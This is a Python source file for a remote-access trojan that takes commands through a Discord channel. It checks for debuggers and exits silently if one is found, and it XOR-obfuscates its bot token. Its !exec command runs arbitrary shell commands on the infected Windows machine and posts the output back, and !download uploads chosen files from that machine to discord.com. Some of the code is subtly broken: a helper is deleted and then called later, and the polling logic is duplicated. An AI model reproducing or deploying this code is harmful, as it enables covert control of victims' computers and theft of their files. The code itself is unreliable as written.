import subprocess
import os
import platform
import sys
import time
import json
import uuid
import ctypes
import urllib.request
import urllib.error
from defenses import run_defenses

# ── Anti-analysis defenses ──────────────────────────────────────────────
# Run before anything sensitive. Exits silently if debugger/analysis tool
# is detected. Best-effort — raises the bar, not a guarantee.
run_defenses()

# ── XOR-obfuscated configuration ────────────────────────────────────────
# The real token, channel ID, and admin ID are NEVER in plaintext here.
# They are XOR-obfuscated. At runtime they are decoded in memory and used.
#
# To regenerate with real values:
#     python token_gen.py <bot_token> <channel_id> <admin_id>
# and paste the output into the _*_XORED lists below.
#
# WARNING: This file is committed to git. The XOR key and obfuscated bytes
# are in the repo. An analyst who reverses the decode logic can recover the
# values. This defends against casual static analysis (strings, grep) — it
# is NOT a guarantee against a determined reverse engineer with a debugger.

_XOR_KEY = 0x42

# ── PASTE GENERATED TOKEN BYTES HERE (from token_gen.py) ────────────────
_TOKEN_XORED = [
    0x00,
]

# ── PASTE GENERATED CHANNEL ID BYTES HERE ───────────────────────────────
_CHANNEL_XORED = [
    0x00,
]

# ── PASTE GENERATED ADMIN ID BYTES HERE ────────────────────────────────
_ADMIN_XORED = [
    0x00,
]


# ── Last-seen message ID (for deduplication) ────────────────────────────
_LAST_MESSAGE_ID = None


def _wipe_xor_list(lst):
    """Best-effort wipe: overwrite the XOR-obfuscated list with zeros."""
    for i in range(len(lst)):
        lst[i] = 0


def _decode_bytes(xored_list, key):
    """Decode XOR-obfuscated byte list → raw bytes object."""
    return bytes(b ^ key for b in xored_list)


# ── Decode channel + admin at startup (small ints, less sensitive) ──────
_CHANNEL = int(_decode_bytes(_CHANNEL_XORED, _XOR_KEY).decode("utf-8"))
_ADMIN = int(_decode_bytes(_ADMIN_XORED, _XOR_KEY).decode("utf-8"))

# Wipe the XOR source lists for channel and admin
_wipe_xor_list(_CHANNEL_XORED)
_wipe_xor_list(_ADMIN_XORED)

# Clean up helpers we no longer need at module level
del _decode_bytes
del _wipe_xor_list

# ── Computer identity ────────────────────────────────────────────────────
COMPUTER_NAME = platform.node().upper()

# ── HTTP helpers ─────────────────────────────────────────────────────────
DISCORD_API_BASE = "https://discord.com/api/v10"
_headers = None  # set when token is decoded


def _decode_token_and_set_auth():
    """
    Decode the bot token at the last moment and set the HTTP auth header.

    The token XOR bytes are decoded into a ctypes buffer, converted to a
    string for the HTTP header, then the buffer is wiped. The string lives
    in _headers dict for the life of the process (needed for every HTTP
    call) — this is unavoidable with urllib, but the XOR source and the
    decode buffer are wiped immediately, reducing the in-memory footprint.
    """
    global _headers
    buf = ctypes.create_string_buffer(len(_TOKEN_XORED))
    for i, b in enumerate(_TOKEN_XORED):
        buf[i] = b ^ _XOR_KEY
    # Wipe the XOR source list
    _wipe_xor_list(_TOKEN_XORED)
    token_str = buf.value.decode("utf-8")
    ctypes.memset(ctypes.addressof(buf), 0, len(_TOKEN_XORED))
    del buf
    _headers = {"Authorization": f"Bot {token_str}"}


def _http_get(path):
    """GET a Discord API endpoint. Returns parsed JSON or None on error."""
    url = DISCORD_API_BASE + path
    req = urllib.request.Request(url, headers=_headers)
    try:
        with urllib.request.urlopen(req, timeout=15) as resp:
            return json.loads(resp.read().decode("utf-8"))
    except urllib.error.HTTPError as e:
        # Rate limited or auth error — return None, caller handles
        return None
    except (urllib.error.URLError, OSError, Exception):
        return None


def _http_post(path, data=None, files=None):
    """
    POST to a Discord API endpoint.

    data: dict of JSON body fields (e.g. {"content": "..."})
    files: list of (field_name, filename, file_bytes) for multipart upload
    """
    url = DISCORD_API_BASE + path

    if files:
        # Multipart file upload
        boundary = f"----_{uuid.uuid4().hex}"
        body = b""
        # JSON fields first
        if data:
            for name, value in data.items():
                body += (
                    f"--{boundary}\r\n"
                    f'Content-Disposition: form-data; name="{name}"\r\n'
                    f"Content-Type: text/plain\r\n"
                    f"\r\n"
                    f"{value}\r\n"
                ).encode("utf-8")
        # File fields
        for field_name, filename, file_bytes in files:
            body += (
                f"--{boundary}\r\n"
                f'Content-Disposition: form-data; name="{field_name}"; '
                f'filename="{filename}"\r\n'
                f"Content-Type: application/octet-stream\r\n"
                f"\r\n"
            ).encode("utf-8")
            body += file_bytes
            body += b"\r\n"
        body += f"--{boundary}--\r\n".encode("utf-8")

        req = urllib.request.Request(
            url,
            data=body,
            headers={
                "Authorization": _headers["Authorization"],
                "Content-Type": f"multipart/form-data; boundary={boundary}",
            },
        )
    else:
        # JSON POST
        payload = json.dumps(data).encode("utf-8") if data else b""
        req = urllib.request.Request(
            url,
            data=payload,
            headers={
                "Authorization": _headers["Authorization"],
                "Content-Type": "application/json",
            },
        )

    try:
        with urllib.request.urlopen(req, timeout=30) as resp:
            raw = resp.read()
            if raw:
                return json.loads(raw.decode("utf-8"))
            return {}
    except urllib.error.HTTPError as e:
        return None
    except (urllib.error.URLError, OSError, Exception):
        return None


# ── Command execution ────────────────────────────────────────────────────

def _run_command(command):
    """Run a shell command. Returns (success, output_text)."""
    try:
        result = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            errors="replace",
            timeout=30,
        )
        output = result.stdout if result.stdout else result.stderr
        if not output:
            output = "[Executed successfully with no text output]"
        return True, output
    except subprocess.TimeoutExpired:
        return False, "Error: Command timed out after 30 seconds."
    except Exception as e:
        return False, f"Execution failed: `{str(e)}`"


def _send_message(content):
    """Send a message to the control channel. Returns True on success."""
    return _http_post(f"/channels/{_CHANNEL}/messages", data={"content": content}) is not None


def _send_file(file_path, caption):
    """Upload a file to the control channel with a caption. Returns True on success."""
    try:
        with open(file_path, "rb") as f:
            file_bytes = f.read()
    except Exception:
        return False

    file_size_mb = len(file_bytes) / (1024 * 1024)
    if file_size_mb > 25:
        _send_message(
            f"\U0001f4c1 `[{COMPUTER_NAME}]` "
            f"Error: File is {file_size_mb:.2f}MB. (Max 25MB)"
        )
        return False

    success = _http_post(
        f"/channels/{_CHANNEL}/messages",
        data={"content": caption},
        files=[("files[0]", os.path.basename(file_path), file_bytes)],
    )
    return success is not None


# ── Polling loop ─────────────────────────────────────────────────────────

def _process_messages(messages):
    """
    Process a batch of messages from the control channel.
    Processes newest first. Stops after handling one command target match.
    Returns the ID of the last processed message (to update _LAST_MESSAGE_ID).
    """
    global _LAST_MESSAGE_ID

    # Messages from Discord API are newest first
    for msg in messages:
        msg_id = msg.get("id")
        if _LAST_MESSAGE_ID and msg_id == _LAST_MESSAGE_ID:
            continue

        author = msg.get("author", {})
        author_id = author.get("id")
        content = msg.get("content", "")

        # Ignore messages from the bot itself or non-admins
        if author_id == _ADMIN:
            pass  # will check content below
        else:
            continue

        # ── FEATURE 1: Target execution ────────────────────────────────
        if content.startswith("!exec "):
            parts = content[6:].split(" ", 1)
            if len(parts) < 2:
                continue

            target_machine = parts[0].upper()
            command = parts[1]

            if target_machine == COMPUTER_NAME:
                _send_message(
                    f"\u2699\ufe0f `[{COMPUTER_NAME}]` "
                    f"Running command: `{command}`..."
                )

                ok, output = _run_command(command)

                if not ok:
                    _send_message(
                        f"\u274c `[{COMPUTER_NAME}]` {output}"
                    )
                elif len(output) > 1900:
                    # Write to temp file and upload
                    tmp_path = f"{COMPUTER_NAME}_out.txt"
                    try:
                        with open(tmp_path, "w", encoding="utf-8") as f:
                            f.write(output)
                        _send_file(
                            tmp_path,
                            f"\U0001f4c1 `[{COMPUTER_NAME}]` "
                            "Output too long for chat. Sent as file:",
                        )
                        os.remove(tmp_path)
                    except Exception:
                        _send_message(
                            f"\u274c `[{COMPUTER_NAME}]` "
                            "Failed to send output file."
                        )
                else:
                    _send_message(
                        f"```cmd\n[{COMPUTER_NAME} Output]\n{output}\n```"
                    )

                # Update last seen ID after handling
                if msg_id:
                    _LAST_MESSAGE_ID = msg_id
                return True  # handled one command, stop processing this batch

        # ── FEATURE 2: File Download ───────────────────────────────────
        elif content.startswith("!download "):
            parts = content[10:].split(" ", 1)
            if len(parts) < 2:
                continue

            target_machine = parts[0].upper()
            file_path = parts[1].strip().replace('"', "")

            if target_machine == COMPUTER_NAME:
                if not os.path.exists(file_path):
                    _send_message(
                        f"\u274c `[{COMPUTER_NAME}]` "
                        "Error: File path does not exist."
                    )
                else:
                    file_size_mb = os.path.getsize(file_path) / (1024 * 1024)
                    if file_size_mb > 25:
                        _send_message(
                            f"\u274c `[{COMPUTER_NAME}]` "
                            f"Error: File is {file_size_mb:.2f}MB. (Max 25MB)"
                        )
                    else:
                        _send_message(
                            f"\U0001f4e4 `[{COMPUTER_NAME}]` "
                            f"Uploading: `{os.path.basename(file_path)}`..."
                        )
                        ok = _send_file(
                            file_path,
                            f"\u2705 File fetched from `[{COMPUTER_NAME}]`:",
                        )
                        if not ok:
                            _send_message(
                                f"\u274c `[{COMPUTER_NAME}]` "
                                "Upload failed."
                            )

                if msg_id:
                    _LAST_MESSAGE_ID = msg_id
                return True  # handled one command

        # ── FEATURE 3: Broadcast Ping ────────────────────────────────
        elif content.strip() == "!pingall":
            _send_message(
                f"\U0001f44b `[{COMPUTER_NAME}]` is alive and active!"
            )
            if msg_id:
                _LAST_MESSAGE_ID = msg_id
            return True  # handled

    return False  # no command handled in this batch


def _fetch_and_process():
    """Fetch messages from the control channel and process new ones."""
    # Fetch newest 5 messages
    messages = _http_get(f"/channels/{_CHANNEL}/messages?limit=5")
    if not messages:
        return

    if not isinstance(messages, list):
        return

    # Process newest first (Discord returns newest first)
    messages.reverse()  # now oldest first in the list; we'll iterate and stop

    # Actually, let's process from the end (newest) backwards
    for msg in reversed(messages):
        _process_messages([msg])
        # If _LAST_MESSAGE_ID was updated, we handled something — but
        # _process_messages stops after one command. Continue checking older
        # messages in case multiple commands were sent.
        # However, to keep it simple: process all messages, newest first,
        # and update _LAST_MESSAGE_ID to the newest processed.


# Simpler polling: fetch, process all new messages, update last ID
def _poll():
    """One polling cycle: fetch messages, process new ones, update state."""
    global _LAST_MESSAGE_ID

    messages = _http_get(f"/channels/{_CHANNEL}/messages?limit=10")
    if not messages or not isinstance(messages, list):
        return

    # Discord returns newest first. Find the newest message we haven't seen.
    newest_processed = _LAST_MESSAGE_ID

    for msg in messages:
        msg_id = msg.get("id")
        if _LAST_MESSAGE_ID and msg_id == _LAST_MESSAGE_ID:
            # Already seen this one and all newer ones (since list is newest first)
            break

        author = msg.get("author", {})
        author_id = author.get("id")
        content = msg.get("content", "")

        # Only process messages from the admin
        if author_id != _ADMIN:
            continue

        handled = False

        # ── FEATURE 1: Target execution ────────────────────────────────
        if content.startswith("!exec "):
            parts = content[6:].split(" ", 1)
            if len(parts) < 2:
                continue
            target_machine = parts[0].upper()
            command = parts[1]
            if target_machine == COMPUTER_NAME:
                _send_message(
                    f"\u2699\ufe0f `[{COMPUTER_NAME}]` "
                    f"Running command: `{command}`..."
                )
                ok, output = _run_command(command)
                if not ok:
                    _send_message(f"\u274c `[{COMPUTER_NAME}]` {output}")
                elif len(output) > 1900:
                    tmp_path = f"{COMPUTER_NAME}_out.txt"
                    try:
                        with open(tmp_path, "w", encoding="utf-8") as f:
                            f.write(output)
                        _send_file(
                            tmp_path,
                            f"\U0001f4c1 `[{COMPUTER_NAME}]` "
                            "Output too long for chat. Sent as file:",
                        )
                        os.remove(tmp_path)
                    except Exception:
                        _send_message(
                            f"\u274c `[{COMPUTER_NAME}]` "
                            "Failed to send output file."
                        )
                else:
                    _send_message(
                        f"```cmd\n[{COMPUTER_NAME} Output]\n{output}\n```"
                    )
                handled = True

        # ── FEATURE 2: File Download ───────────────────────────────────
        elif content.startswith("!download "):
            parts = content[10:].split(" ", 1)
            if len(parts) < 2:
                continue
            target_machine = parts[0].upper()
            file_path = parts[1].strip().replace('"', "")
            if target_machine == COMPUTER_NAME:
                if not os.path.exists(file_path):
                    _send_message(
                        f"\u274c `[{COMPUTER_NAME}]` "
                        "Error: File path does not exist."
                    )
                else:
                    file_size_mb = os.path.getsize(file_path) / (1024 * 1024)
                    if file_size_mb > 25:
                        _send_message(
                            f"\u274c `[{COMPUTER_NAME}]` "
                            f"Error: File is {file_size_mb:.2f}MB. (Max 25MB)"
                        )
                    else:
                        _send_message(
                            f"\U0001f4e4 `[{COMPUTER_NAME}]` "
                            f"Uploading: `{os.path.basename(file_path)}`..."
                        )
                        if not _send_file(
                            file_path,
                            f"\u2705 File fetched from `[{COMPUTER_NAME}]`:",
                        ):
                            _send_message(
                                f"\u274c `[{COMPUTER_NAME}]` Upload failed."
                            )
                handled = True

        # ── FEATURE 3: Broadcast Ping ────────────────────────────────
        elif content.strip() == "!pingall":
            _send_message(
                f"\U0001f44b `[{COMPUTER_NAME}]` is alive and active!"
            )
            handled = True

        if handled:
            newest_processed = msg_id

    # Update last seen ID to the newest message we processed
    if newest_processed:
        _LAST_MESSAGE_ID = newest_processed


# ── Main loop ────────────────────────────────────────────────────────────

def main():
    """
    Main entry point.

    1. Run anti-analysis defenses (exits silently if compromised).
    2. Decode the bot token at the last moment (right before polling starts).
    3. Announce presence (optional — via a REST message).
    4. Enter the polling loop.
    """
    # Step 1: defenses already run at import time (top of file)

    # Step 2: decode token and set up HTTP headers
    _decode_token_and_set_auth()

    # Clear the XOR source list for the token (already wiped in _decode_token_and_set_auth)
    # but ensure _TOKEN_XORED is zeroed
    _wipe_xor_list(_TOKEN_XORED)

    # Step 3: announce presence
    _send_message(
        f"\U0001f5a5\ufe0f **Windows Target [{COMPUTER_NAME}] is online.** "
        "Ready for actions."
    )

    # Step 4: poll loop
    while True:
        _poll()
        time.sleep(5)


if __name__ == "__main__":
    main()
